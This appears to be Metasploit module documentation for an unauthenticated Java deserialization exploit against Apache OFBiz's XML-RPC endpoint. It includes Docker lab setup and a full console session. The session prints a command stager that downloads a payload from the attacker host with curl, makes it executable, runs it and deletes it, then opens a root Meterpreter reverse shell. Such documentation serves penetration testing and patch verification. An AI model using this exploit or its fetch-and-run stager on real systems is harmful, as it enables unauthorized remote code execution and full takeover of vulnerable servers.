## Vulnerable Application

### Description

This module exploits a Java deserialization vulnerability in Apache
OFBiz's unauthenticated XML-RPC endpoint `/webtools/control/xmlrpc` for
versions prior to 17.12.04.

### Setup

You can use <https://hub.docker.com/r/opensourceknight/ofbiz>.

1. Initialize the database with demo data (`INIT_DB=2`) and bind to ports 8080 and 8443
    * `docker run -p 8080:8080 -p 8443:8443  --rm -e INIT_DB=2 opensourceknight/ofbiz:15.12`

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This executes a Unix command.

### 1

This uses a Linux dropper to execute code.

## Scenarios

### Apache OFBiz from [Docker](#setup).

```
msf6 > use exploit/linux/http/apache_ofbiz_deserialization
[*] Using configured payload linux/x64/meterpreter_reverse_https
msf6 exploit(linux/http/apache_ofbiz_deserialization) > options

Module options (exploit/linux/http/apache_ofbiz_deserialization):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8443             yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter_reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper


msf6 exploit(linux/http/apache_ofbiz_deserialization) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(linux/http/apache_ofbiz_deserialization) > set lhost 192.168.1.7
lhost => 192.168.1.7
msf6 exploit(linux/http/apache_ofbiz_deserialization) > set srvport 8888
srvport => 8888
msf6 exploit(linux/http/apache_ofbiz_deserialization) > run

[*] Started HTTPS reverse handler on https://192.168.1.7:8443
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Target can deserialize arbitrary data.
[*] Executing Linux Dropper for linux/x64/meterpreter_reverse_https
[*] Using URL: http://0.0.0.0:8888/AGB4cD
[*] Local IP: http://10.3.227.250:8888/AGB4cD
[*] Generated command stager: ["curl${IFS}-so${IFS}/tmp/fNZHtLgv${IFS}http://192.168.1.7:8888/AGB4cD;chmod${IFS}+x${IFS}/tmp/fNZHtLgv;/tmp/fNZHtLgv;rm${IFS}-f${IFS}/tmp/fNZHtLgv"]
[*] Executing command: sh -c curl${IFS}-so${IFS}/tmp/fNZHtLgv${IFS}http://192.168.1.7:8888/AGB4cD;chmod${IFS}+x${IFS}/tmp/fNZHtLgv;/tmp/fNZHtLgv;rm${IFS}-f${IFS}/tmp/fNZHtLgv
[*] Client 192.168.1.7 (curl/7.38.0) requested /AGB4cD
[*] Sending payload to 192.168.1.7 (curl/7.38.0)
[+] Successfully executed command: sh -c curl${IFS}-so${IFS}/tmp/fNZHtLgv${IFS}http://192.168.1.7:8888/AGB4cD;chmod${IFS}+x${IFS}/tmp/fNZHtLgv;/tmp/fNZHtLgv;rm${IFS}-f${IFS}/tmp/fNZHtLgv
[*] https://192.168.1.7:8443 handling request from 192.168.1.7; (UUID: btpun2w7) Redirecting stageless connection from /1fY1FTBqS3Z81nrUI-E3VQ3E-Kqn5Kx4lP2cAzF4bmUgveaMUNylCEh1ohulKhz1fERPwYd8u4DAauCLZ8UDm5JaB7P with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] https://192.168.1.7:8443 handling request from 192.168.1.7; (UUID: btpun2w7) Attaching orphaned/stageless session...
[*] Command Stager progress - 104.14% done (151/145 bytes)
[*] Meterpreter session 1 opened (192.168.1.7:8443 -> 192.168.1.7:61375) at 2020-08-14 21:42:11 -0500
[*] Server stopped.

meterpreter > getuid
Server username: root @ 09d1564c6b2c (uid=0, gid=0, euid=0, egid=0)
meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Debian 8.4 (Linux 4.19.76-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
